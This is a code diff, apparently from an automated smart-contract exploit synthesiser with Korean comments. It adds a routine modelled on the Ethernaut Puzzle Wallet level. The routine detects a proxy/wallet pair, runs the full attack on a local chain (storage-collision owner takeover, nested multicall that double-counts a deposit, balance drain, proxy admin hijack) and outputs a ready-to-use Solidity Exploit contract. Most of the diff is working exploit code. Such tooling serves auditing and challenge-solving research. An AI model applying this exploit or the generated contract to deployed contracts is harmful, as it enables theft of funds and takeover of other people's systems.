@@ -2557,6 +2557,110 @@ def _synth_eip7702_reentrancy(name, target_src, invariants_src, manifest, scan_s
             "ms":int((time.time()-t0)*1000)}
 
 
+def _synth_puzzle_wallet(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut Puzzle Wallet 류: 프록시(pendingAdmin/admin)와 월렛(owner/maxBalance)의
+    스토리지 충돌 + multicall 예치 중복. proposeNewAdmin 으로 owner 선점 → 화이트리스트 →
+    중첩 multicall 로 예치 2배 계상 → execute 로 잔액 소진 → setMaxBalance 로 admin 탈취.
+    프록시의 admin() 이 공격자로 바뀌는지로 증명한다."""
+    import solcx
+    from web3 import Web3
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    # 이 컨트랙트가 프록시여야(proposeNewAdmin + admin) 하고, 형제 월렛(multicall+setMaxBalance)이 있어야
+    if not (re.search(r"function\s+proposeNewAdmin", tb) and re.search(r"\badmin\b", tb)):
+        return None
+    wallet = None
+    for cn, b in bodies.items():
+        if cn != name and re.search(r"function\s+multicall\s*\(\s*bytes", b) and re.search(r"function\s+setMaxBalance", b):
+            wallet = cn; break
+    if not wallet:
+        return None
+    _solcv, _evm = _solc_for(target_src)
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try: compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception: return None
+    arts = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts or wallet not in arts:
+        return None
+    w3, acct = _mk_evm()
+    accts = list(w3.eth.accounts); deployer = accts[1] if len(accts) > 1 else acct
+    attacker = acct
+    def dep(cn, args, frm, value=0):
+        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
+        return w3.eth.wait_for_transaction_receipt(
+            C.constructor(*args).transact({"from":frm,"value":value,"gas":6_000_000})).contractAddress
+    try:
+        wimpl_addr = dep(wallet, [], deployer)
+        wimpl = w3.eth.contract(abi=arts[wallet]["abi"], bytecode=arts[wallet]["bin"])
+        initdata = bytes.fromhex(wimpl.encode_abi("init", [10**16])[2:])
+        # 프록시 생성자: (address _admin, address _impl, bytes _initData) — 첫 addr=admin, 둘째 addr=impl
+        ptypes = _abi_ctor_types(arts[name]["abi"])
+        cargs = []; addr_i = 0
+        for tI in ptypes:
+            if tI == "address":
+                cargs.append(Web3.to_checksum_address(deployer if addr_i == 0 else wimpl_addr)); addr_i += 1
+            elif tI == "bytes":
+                cargs.append(initdata)
+            else:
+                cargs.append(_default_for_type(tI))
+        proxy = dep(name, cargs, deployer)
+    except Exception:
+        return None
+    # 레벨 셋업 자금(0.001 ETH) 시드
+    try: w3.eth.send_transaction({"from":accts[-1],"to":proxy,"value":10**15,"gas":120000})
+    except Exception: pass
+    proxyC = w3.eth.contract(address=proxy, abi=arts[name]["abi"])
+    wal = w3.eth.contract(address=proxy, abi=arts[wallet]["abi"])
+    if not _has_getter(arts[name]["abi"], "admin"):
+        return None
+    a0 = proxyC.functions.admin().call()
+    try:
+        proxyC.functions.proposeNewAdmin(Web3.to_checksum_address(attacker)).transact({"from":attacker,"gas":200000})
+        wal.functions.addToWhitelist(Web3.to_checksum_address(attacker)).transact({"from":attacker,"gas":200000})
+        dep_data = bytes.fromhex(wal.encode_abi("deposit", [])[2:])
+        inner = bytes.fromhex(wal.encode_abi("multicall", [[dep_data]])[2:])
+        wal.functions.multicall([dep_data, inner]).transact({"from":attacker,"value":10**15,"gas":1_000_000})
+        wal.functions.execute(Web3.to_checksum_address(attacker), 2*10**15, b"").transact({"from":attacker,"gas":1_000_000})
+        wal.functions.setMaxBalance(int(attacker, 16)).transact({"from":attacker,"gas":300000})
+    except Exception:
+        return None
+    a1 = proxyC.functions.admin().call()
+    if a1 == a0 or int(a1, 16) != int(attacker, 16):
+        return None
+    poc = (HEADER +
+        "// Strategy: Puzzle Wallet. Proxy(pendingAdmin/admin) collides with wallet(owner/\n"
+        "// maxBalance). proposeNewAdmin -> become owner; whitelist; nested multicall double-\n"
+        "// counts one deposit; execute drains to 0; setMaxBalance writes slot1 => admin.\n"
+        "interface IProxy { function proposeNewAdmin(address) external; function admin() external view returns (address); }\n"
+        "interface IWallet { function addToWhitelist(address) external; function deposit() external payable;\n"
+        "    function multicall(bytes[] calldata) external payable; function execute(address,uint256,bytes calldata) external;\n"
+        "    function setMaxBalance(uint256) external; }\n"
+        "contract Exploit {\n"
+        "    function run(address payable proxy) external payable {\n"
+        "        IProxy(proxy).proposeNewAdmin(address(this));\n"
+        "        IWallet(proxy).addToWhitelist(address(this));\n"
+        "        bytes[] memory inner = new bytes[](1); inner[0] = abi.encodeWithSignature(\"deposit()\");\n"
+        "        bytes[] memory outer = new bytes[](2);\n"
+        "        outer[0] = abi.encodeWithSignature(\"deposit()\");\n"
+        "        outer[1] = abi.encodeWithSignature(\"multicall(bytes[])\", inner);\n"
+        "        IWallet(proxy).multicall{value: msg.value}(outer);\n"
+        "        IWallet(proxy).execute(address(this), msg.value * 2, \"\");\n"
+        "        IWallet(proxy).setMaxBalance(uint256(uint160(address(this))));\n"
+        "    }\n    receive() external payable {}\n}\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (puzzle-wallet)","strategy":"puzzle-wallet","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":"proxy admin hijacked (storage collision + multicall)",
+            "strategy":"puzzle-wallet:setMaxBalance","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "note":"프록시/월렛 스토리지 충돌로 owner→admin 을 선점하고 중첩 multicall 예치 중복으로 잔액을 비운 뒤 admin 을 탈취했습니다.",
+            "ms":int((time.time()-t0)*1000)}
+
+
 def _synth_uninitialized(name, target_src, invariants_src, manifest, scan_step, t0):
     """Ethernaut Motorbike 류(및 미보호 initializer 일반화): 구현/컨트랙트가 초기화되지
     않은 채 배포되어, 누구나 initialize() 를 호출해 특권 주소(upgrader/owner/admin)를 선점한다.
@@ -4443,6 +4547,13 @@ def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_s
             return r
     except Exception:
         pass
+    # 0z) Puzzle Wallet (프록시 스토리지 충돌 + multicall → admin 탈취)
+    try:
+        r = _synth_puzzle_wallet(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
     # 0y) Motorbike (초기화되지 않은 initializer → upgrader 선점)
     try:
         r = _synth_uninitialized(name, target_src, invariants_src, manifest, scan_step, t0)
@@ -4554,7 +4665,7 @@ def iter_engine_candidates(name, target_src, invariants_src, manifest, do_verify
                _synth_higher_order, _synth_switch, _synth_array_underflow,
                _synth_dex_two_drain, _synth_dex_drain, _synth_good_samaritan,
                _synth_eip7702_reentrancy, _synth_gatekeeper_three, _synth_stake_accounting,
-               _synth_uninitialized):
+               _synth_uninitialized, _synth_puzzle_wallet):
         try:
             r = fn(name, target_src, inv, manifest, scan_step, t0)
         except Exception:
